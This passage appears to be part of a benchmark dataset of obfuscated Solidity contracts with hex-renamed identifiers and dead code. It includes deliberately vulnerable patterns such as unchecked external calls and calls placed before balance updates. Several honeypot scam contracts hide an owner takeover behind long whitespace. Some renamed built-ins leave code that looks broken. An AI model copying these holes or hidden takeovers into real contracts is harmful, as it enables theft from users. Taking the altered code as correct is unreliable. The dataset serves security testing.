{\n                _0x2131c1.call.value(_0xaf8791);\n                Holders[_0x2131c1]-=_0xaf8791;\n            }\n        }\n    }\n\n}",
      "rename_map": {
        "initTokenBank": "_0xd27dfb",
        "confirmOwner": "_0x7720e1",
        "changeOwner": "_0x4eb446",
        "onlyOwner": "_0x12175f",
        "newOwner": "_0xd34176",
        "_amount": "_0x442b26",
        "amount": "_0xbc71ee",
        "_token": "_0x40eaf8",
        "token": "_0x271731",
        "_addr": "_0x2131c1",
        "owner": "_0x155d11",
        "addr": "_0xfd6a22",
        "_wei": "_0xaf8791",
        "sha3": "_0x97ed30",
        "_to": "_0xfb378b",
        "to": "_0xf73c6d"
      },
      "changes": [
        "Renamed 16 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_050",
      "transformed_id": "ss_l4_medium_sn_ds_050",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address _0x0e92a6;\n    address _0x236ee4 = msg.sender;\n\n    function _0x1240a5(address _0x9874ee)\n    public\n    _0xca615f\n    {\n        uint256 _unused1 = 0;\n        // Placeholder for future logic\n        _0x0e92a6 = _0x9874ee;\n    }\n\n    function _0x57b545()\n    public\n    {\n        bool _flag3 = false;\n        uint256 _unused4 = 0;\n        if(msg.sender==_0x0e92a6)\n        {\n            _0x236ee4=_0x0e92a6;\n        }\n    }\n\n    modifier _0xca615f\n    {\n        if(_0x236ee4 == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address _0x236ee4 = msg.sender;\n    function WithdrawToken(address _0x47ce1d, uint256 _0x43378f,address _0x4732cc)\n    public\n    _0xca615f\n    {\n        _0x47ce1d.call(bytes4(_0xc5697d(\"transfer(address,uint256)\")),_0x4732cc,_0x43378f);\n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n\n     ///Constructor\n    function _0x0d217e()\n    public\n    {\n        _0x236ee4 = msg.sender;\n        MinDeposit = 1 ether;\n    }\n\n    function()\n    payable\n    {\n        Deposit();\n    }\n\n    function Deposit()\n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n\n    function WitdrawTokenToHolder(address _0xc02c32,address _0x356a34,uint _0x8149f1)\n    public\n    _0xca615f\n    {\n        if(Holders[_0xc02c32]>0)\n        {\n            Holders[_0xc02c32]=0;\n            WithdrawToken(_0x356a34,_0x8149f1,_0xc02c32);\n        }\n    }\n\n    function WithdrawToHolder(address _0xfac427, uint _0x86465b)\n    public\n    _0xca615f\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_0xfac427]>=_0x86465b)\n            {\n                _0xfac427.call.value(_0x86465b);\n                Holders[_0xfac427]-=_0x86465b;\n            }\n        }\n    }\n\n    function Bal() public constant returns(uint){return this.balance;}\n}",
      "rename_map": {
        "initTokenBank": "_0x0d217e",
        "confirmOwner": "_0x57b545",
        "changeOwner": "_0x1240a5",
        "onlyOwner": "_0xca615f",
        "newOwner": "_0x0e92a6",
        "_amount": "_0x8149f1",
        "amount": "_0x43378f",
        "_token": "_0x356a34",
        "token": "_0x47ce1d",
        "_addr": "_0xfac427",
        "owner": "_0x236ee4",
        "addr": "_0x9874ee",
        "_wei": "_0x86465b",
        "sha3": "_0xc5697d",
        "_to": "_0xc02c32",
        "to": "_0x4732cc"
      },
      "changes": [
        "Renamed 16 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_051",
      "transformed_id": "ss_l4_medium_sn_ds_051",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.18;\n\ncontract MultiplicatorX4\n{\n    address public Owner = msg.sender;\n\n    function() public payable{}\n\n    function _0x251137()\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address _0xbe606c,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        _0xbe606c.call.value(msg.value)(data);\n    }\n\n    function _0xef1d21(address _0xbe606c)\n    public\n    payable\n    {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        if(msg.value>=this.balance)\n        {\n            _0xbe606c.transfer(this.balance+msg.value);\n        }\n    }\n}",
      "rename_map": {
        "multiplicate": "_0xef1d21",
        "withdraw": "_0x251137",
        "adr": "_0xbe606c"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_052",
      "transformed_id": "ss_l4_medium_sn_ds_052",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway2\n{\n    address public Owner = msg.sender;\n    uint constant public _0x6b530b = 0.999001 ether;\n\n    function()\n    public\n    payable\n    {\n\n    }\n\n    function _0x556cee()\n    public\n    payable\n    {\n        // Placeholder for future logic\n        bool _flag2 = false;\n        if(msg.value>=_0x6b530b)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function _0x86010c()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address _0xca2525,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        _0xca2525.call.value(msg.value)(data);\n    }\n}",
      "rename_map": {
        "minEligibility": "_0x6b530b",
        "withdraw": "_0x86010c",
        "redeem": "_0x556cee",
        "adr": "_0xca2525"
      },
      "changes": [
        "Renamed 4 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_053",
      "transformed_id": "ss_l4_medium_sn_ds_053",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract _0x881dd1{\n\n    function transfer(address from,address _0x2471d1,address[] _0xa912b8,uint v)public returns (bool){\n        require(_0xa912b8.length > 0);\n        bytes4 _0x8f48fc=bytes4(_0x8068dc(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_0xa912b8.length;i++){\n            _0x2471d1.call(_0x8f48fc,from,_0xa912b8[i],v);\n        }\n        return true;\n    }\n}",
      "rename_map": {
        "keccak256": "_0x8068dc",
        "caddress": "_0x2471d1",
        "airdrop": "_0x881dd1",
        "_tos": "_0xa912b8",
        "id": "_0x8f48fc"
      },
      "changes": [
        "Renamed 5 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_054",
      "transformed_id": "ss_l4_medium_sn_ds_054",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.18;\n\ncontract EBU{\n    address public from = 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9;\n    address public _0x4f4f30 = 0x1f844685f7Bf86eFcc0e74D8642c54A257111923;\n\n    function transfer(address[] _0x92583b,uint[] v)public returns (bool){\n        require(msg.sender == 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9);\n        require(_0x92583b.length > 0);\n        bytes4 _0x957f77=bytes4(_0xe40575(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_0x92583b.length;i++){\n            _0x4f4f30.call(_0x957f77,from,_0x92583b[i],v[i]*1000000000000000000);\n        }\n        return true;\n    }\n}",
      "rename_map": {
        "keccak256": "_0xe40575",
        "caddress": "_0x4f4f30",
        "_tos": "_0x92583b",
        "id": "_0x957f77"
      },
      "changes": [
        "Renamed 4 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_055",
      "transformed_id": "ss_l4_medium_sn_ds_055",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract _0x6d1563{\n\n    function transfer(address from,address _0xbc3d57,address[] _0xb67eba,uint v)public returns (bool){\n        require(_0xb67eba.length > 0);\n        bytes4 _0x47287d=bytes4(_0xeda28a(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_0xb67eba.length;i++){\n            _0xbc3d57.call(_0x47287d,from,_0xb67eba[i],v);\n        }\n        return true;\n    }\n}",
      "rename_map": {
        "keccak256": "_0xeda28a",
        "caddress": "_0xbc3d57",
        "airPort": "_0x6d1563",
        "_tos": "_0xb67eba",
        "id": "_0x47287d"
      },
      "changes": [
        "Renamed 5 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_056",
      "transformed_id": "ss_l4_medium_sn_ds_056",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.13;\n\ncontract Centra4 {\n\n\tfunction transfer() returns (bool) {\n\t\taddress _0xac8c6d;\n\t\t_0xac8c6d = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;\n\t\taddress _0x564a8e;\n\t\taddress _0xbd7f1a;\n\t\tuint256 k;\n\t\tk = 1;\n\n\t\t_0xbd7f1a = 0xaa27f8c1160886aacba64b2319d8d5469ef2af79;\n\t\t_0xac8c6d.call(\"register\", \"CentraToken\");\n\t\tif(!_0xac8c6d.call(bytes4(_0x4cc66f(\"transfer(address,uint256)\")),_0xbd7f1a,k)) return false;\n\n\t\treturn true;\n\t}\n\n}",
      "rename_map": {
        "contract_address": "_0xac8c6d",
        "keccak256": "_0x4cc66f",
        "c1": "_0x564a8e",
        "c2": "_0xbd7f1a"
      },
      "changes": [
        "Renamed 4 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_057",
      "transformed_id": "ss_l4_medium_sn_ds_057",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\ncontract Token {\n    function transfer(address _0x1415e9, uint _0x82ba4e) returns (bool _0x61ca49);\n    function _0x19c37d(address _0x6e6e63) constant returns (uint balance);\n}\ncontract EtherGet {\n    address _0x1917f7;\n    function EtherGet() {\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x1917f7 = msg.sender; }\n    }\n    function _0xa56140(address _0xa37bfe) public {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n        Token _0x9a1a7c = Token(_0xa37bfe);\n        _0x9a1a7c.transfer(_0x1917f7, _0x9a1a7c._0x19c37d(this));\n    }\n    function _0x9ff12a() public {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n        _0x1917f7.transfer(this.balance);\n    }\n    function _0x2cea82(uint _0x1af8bf, address _0xec02ef) public {\n        for(uint i = 0; i < _0x1af8bf; i++){\n            _0xec02ef.call.value(0 wei)();\n        }\n    }\n}",
      "rename_map": {
        "withdrawTokens": "_0xa56140",
        "tokenContract": "_0xa37bfe",
        "withdrawEther": "_0x9ff12a",
        "getTokens": "_0x2cea82",
        "balanceOf": "_0x19c37d",
        "success": "_0x61ca49",
        "_owner": "_0x6e6e63",
        "_value": "_0x82ba4e",
        "owner": "_0x1917f7",
        "addr": "_0xec02ef",
        "num": "_0x1af8bf",
        "_to": "_0x1415e9",
        "tc": "_0x9a1a7c"
      },
      "changes": [
        "Renamed 13 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_058",
      "transformed_id": "ss_l4_medium_sn_ds_058",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.18;\n\ncontract MultiplicatorX3\n{\n    address public Owner = msg.sender;\n\n    function() public payable{}\n\n    function _0x89bc82()\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address _0xf9b26c,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        _0xf9b26c.call.value(msg.value)(data);\n    }\n\n    function _0xdcbf76(address _0xf9b26c)\n    public\n    payable\n    {\n        // Placeholder for future logic\n        bool _flag2 = false;\n        if(msg.value>=this.balance)\n        {\n            _0xf9b26c.transfer(this.balance+msg.value);\n        }\n    }\n}",
      "rename_map": {
        "multiplicate": "_0xdcbf76",
        "withdraw": "_0x89bc82",
        "adr": "_0xf9b26c"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_059",
      "transformed_id": "ss_l4_medium_sn_ds_059",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract SimpleWallet {\n    address public _0xcbfc1a = msg.sender;\n    uint public _0x9e369d;\n\n    modifier _0x459875 {\n        require(msg.sender == _0xcbfc1a);\n        _;\n    }\n\n    function() public payable {\n        _0x9e369d++;\n    }\n\n    function _0x7a002a() public _0x459875 {\n        if (false) { revert(); }\n        bool _flag2 = false;\n        _0x27e7fb(address(this).balance);\n    }\n\n    function _0x27e7fb(uint _0x8c1cf0) public _0x459875 {\n        uint256 _unused3 = 0;\n        uint256 _unused4 = 0;\n        msg.sender.transfer(_0x8c1cf0);\n    }\n\n    function _0x054fe3(address _0x0c170a, uint _0x8c1cf0, bytes _0x0cad8a) public _0x459875 {\n        _0x0c170a.call.value(_0x8c1cf0)(_0x0cad8a);\n    }\n}",
      "rename_map": {
        "depositsCount": "_0x9e369d",
        "withdrawAll": "_0x7a002a",
        "sendMoney": "_0x054fe3",
        "onlyOwner": "_0x459875",
        "withdraw": "_0x27e7fb",
        "_target": "_0x0c170a",
        "_value": "_0x8c1cf0",
        "owner": "_0xcbfc1a",
        "_data": "_0x0cad8a"
      },
      "changes": [
        "Renamed 9 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_060",
      "transformed_id": "ss_l4_medium_sn_ds_060",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract Ownable\n{\n    address _0xb3b6f6;\n    address _0x614263 = msg.sender;\n\n    function _0x01899f(address _0xb34acf)\n    public\n    _0x4c26d7\n    {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        _0xb3b6f6 = _0xb34acf;\n    }\n\n    function _0x36c3e6()\n    public\n    {\n        uint256 _unused3 = 0;\n        bool _flag4 = false;\n        if(msg.sender==_0xb3b6f6)\n        {\n            _0x614263=_0xb3b6f6;\n        }\n    }\n\n    modifier _0x4c26d7\n    {\n        if(_0x614263 == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address _0x614263 = msg.sender;\n    function WithdrawToken(address _0x467635, uint256 _0xd4faea,address _0x8c3967)\n    public\n    _0x4c26d7\n    {\n        _0x467635.call(bytes4(_0x6cb852(\"transfer(address,uint256)\")),_0x8c3967,_0xd4faea);\n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n\n     ///Constructor\n    function _0x995f63()\n    public\n    {\n        _0x614263 = msg.sender;\n        MinDeposit = 1 ether;\n    }\n\n    function()\n    payable\n    {\n        Deposit();\n    }\n\n    function Deposit()\n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n\n    function WitdrawTokenToHolder(address _0x22eef1,address _0x65b78f,uint _0x07371d)\n    public\n    _0x4c26d7\n    {\n        if(Holders[_0x22eef1]>0)\n        {\n            Holders[_0x22eef1]=0;\n            WithdrawToken(_0x65b78f,_0x07371d,_0x22eef1);\n        }\n    }\n\n    function WithdrawToHolder(address _0x060a99, uint _0x5e3a9f)\n    public\n    _0x4c26d7\n    payable\n    {\n        if(Holders[_0x060a99]>0)\n        {\n            if(_0x060a99.call.value(_0x5e3a9f)())\n            {\n                Holders[_0x060a99]-=_0x5e3a9f;\n            }\n        }\n    }\n}",
      "rename_map": {
        "initTokenBank": "_0x995f63",
        "confirmOwner": "_0x36c3e6",
        "changeOwner": "_0x01899f",
        "onlyOwner": "_0x4c26d7",
        "newOwner": "_0xb3b6f6",
        "_amount": "_0x07371d",
        "amount": "_0xd4faea",
        "_token": "_0x65b78f",
        "token": "_0x467635",
        "_addr": "_0x060a99",
        "owner": "_0x614263",
        "addr": "_0xb34acf",
        "_wei": "_0x5e3a9f",
        "sha3": "_0x6cb852",
        "_to": "_0x22eef1",
        "to": "_0x8c3967"
      },
      "changes": [
        "Renamed 16 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_061",
      "transformed_id": "ss_l4_medium_sn_ds_061",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract HomeyJar {\n    address public Owner = msg.sender;\n\n    function() public payable {}\n\n    function GetHoneyFromJar() public payable {\n        bool _flag1 = false;\n        // Placeholder for future logic\n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function _0x22252f() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address _0xa1a70c,bytes data) payable public {\n        require(msg.sender == Owner);\n        _0xa1a70c.call.value(msg.value)(data);\n    }\n}",
      "rename_map": {
        "withdraw": "_0x22252f",
        "adr": "_0xa1a70c"
      },
      "changes": [
        "Renamed 2 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_062",
      "transformed_id": "ss_l4_medium_sn_ds_062",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway1\n{\n    address public Owner = msg.sender;\n    uint constant public _0x42c5be = 0.999001 ether;\n\n    function()\n    public\n    payable\n    {\n\n    }\n\n    function _0x150279()\n    public\n    payable\n    {\n        bool _flag1 = false;\n        // Placeholder for future logic\n        if(msg.value>=_0x42c5be)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function _0x4dd1fb()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address _0x73c382,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        _0x73c382.call.value(msg.value)(data);\n    }\n}",
      "rename_map": {
        "minEligibility": "_0x42c5be",
        "withdraw": "_0x4dd1fb",
        "redeem": "_0x150279",
        "adr": "_0x73c382"
      },
      "changes": [
        "Renamed 4 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_063",
      "transformed_id": "ss_l4_medium_sn_ds_063",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway1\n{\n    address public Owner = msg.sender;\n\n    function()\n    public\n    payable\n    {\n\n    }\n\n    function GetFreebie()\n    public\n    payable\n    {\n        uint256 _unused1 = 0;\n        if (false) { revert(); }\n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function _0xd31939()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address _0x744b4d,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        _0x744b4d.call.value(msg.value)(data);\n    }\n}",
      "rename_map": {
        "withdraw": "_0xd31939",
        "adr": "_0x744b4d"
      },
      "changes": [
        "Renamed 2 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_064",
      "transformed_id": "ss_l4_medium_sn_ds_064",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract Pie\n{\n    address public Owner = msg.sender;\n\n    function()\n    public\n    payable\n    {\n\n    }\n\n    function GetPie()\n    public\n    payable\n    {\n        if (false) { revert(); }\n        bool _flag2 = false;\n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function _0x12011a()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address _0xf5d300,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        _0xf5d300.call.value(msg.value)(data);\n    }\n}",
      "rename_map": {
        "withdraw": "_0x12011a",
        "adr": "_0xf5d300"
      },
      "changes": [
        "Renamed 2 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_065",
      "transformed_id": "ss_l4_medium_sn_ds_065",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.16;\n\n/// @author Bowen Sanders\n/// sections built on the work of Jordi Baylina (Owned, data structure)\n/// smartwedindex.sol contains a simple index of contract address, couple name, actual marriage date, bool displayValues to\n/// be used to create an array of all SmartWed contracts that are deployed\n/// contract 0wned is licesned under GNU-3\n\n/// @dev `Owned` is a base level contract that assigns an `owner` that can be\n///  later changed\ncontract Owned {\n\n    /// @dev `owner` is the only address that can call a function with this\n    /// modifier\n    modifier _0xc7660c() {\n        require(msg.sender == _0x6bd10e);\n        _;\n    }\n\n    address public _0x6bd10e;\n\n    /// @notice The Constructor assigns the message sender to be `owner`\n    function Owned() {\n        _0x6bd10e = msg.sender;\n    }\n\n    address public _0x36f84b;\n\n    /// @notice `owner` can step down and assign some other address to this role\n    /// @param _newOwner The address of the new owner\n    ///  an unowned neutral vault, however that cannot be undone\n    function _0xfe0406(address _0xf68d3e) _0xc7660c {\n        _0x36f84b = _0xf68d3e;\n    }\n    /// @notice `newOwner` has to accept the ownership before it is transferred\n    ///  Any account or any contract with the ability to call `acceptOwnership`\n    ///  can be used to accept ownership of this contract, including a contract\n    ///  with no other functions\n    function _0xefdd7b() {\n        if (msg.sender == _0x36f84b) {\n            _0x6bd10e = _0x36f84b;\n        }\n    }\n\n    // This is a general safty function that allows the owner to do a lot\n    //  of things in the unlikely event that something goes wrong\n    // _dst is the contract being called making this like a 1/1 multisig\n    function _0x7a9e2f(address _0x0a222e, uint _0x358a96, bytes _0xe397cb) _0xc7660c {\n        _0x0a222e.call.value(_0x358a96)(_0xe397cb);\n    }\n}\n\n// contract WedIndex\n\ncontract WedIndex is Owned {\n\n    // declare index data variables\n    string public _0x7411dc;\n    string public _0xac3956;\n    uint public _0x8bd365;\n    uint public _0xe8561a;\n    uint public _0x9be27c;\n\n    IndexArray[] public _0x84e9eb;\n\n    struct IndexArray {\n        uint _0x8bd365;\n        string _0x7411dc;\n        string _0xac3956;\n        uint _0xe8561a;\n        uint _0x9be27c;\n    }\n\n    function _0xb024fd() constant public returns (uint) {\n        return _0x84e9eb.length;\n    }\n\n    // make functions to write and read index entries and nubmer of entries\n    function _0x8d1c26(uint _0x8bd365, string _0x7411dc, string _0xac3956, uint _0xe8561a, uint _0x9be27c) {\n        _0x84e9eb.push(IndexArray(_0x7ab0c2, _0x7411dc, _0xac3956, _0xe8561a, _0x9be27c));\n        IndexWritten(_0x7ab0c2, _0x7411dc, _0xac3956, _0xe8561a, _0x9be27c);\n    }\n\n    // declare events\n    event IndexWritten (uint _0xaff349, string _0xc44b36, string _0xe4d849, uint _0xe8561a, uint _0x0dab92);\n}",
      "rename_map": {
        "displaymultisig": "_0x9be27c",
        "contractaddress": "_0xc44b36",
        "acceptOwnership": "_0xefdd7b",
        "numberOfIndex": "_0xb024fd",
        "partnernames": "_0xac3956",
        "weddingdate": "_0xe8561a",
        "changeOwner": "_0xfe0406",
        "indexarray": "_0x84e9eb",
        "writeIndex": "_0x8d1c26",
        "wedaddress": "_0x7411dc",
        "indexdate": "_0x8bd365",
        "onlyOwner": "_0xc7660c",
        "_newOwner": "_0xf68d3e",
        "newOwner": "_0x36f84b",
        "partners": "_0xe4d849",
        "execute": "_0x7a9e2f",
        "display": "_0x0dab92",
        "_value": "_0x358a96",
        "owner": "_0x6bd10e",
        "_data": "_0xe397cb",
        "time": "_0xaff349",
        "_dst": "_0x0a222e",
        "now": "_0x7ab0c2"
      },
      "changes": [
        "Renamed 23 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_066",
      "transformed_id": "ss_l4_medium_sn_ds_066",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
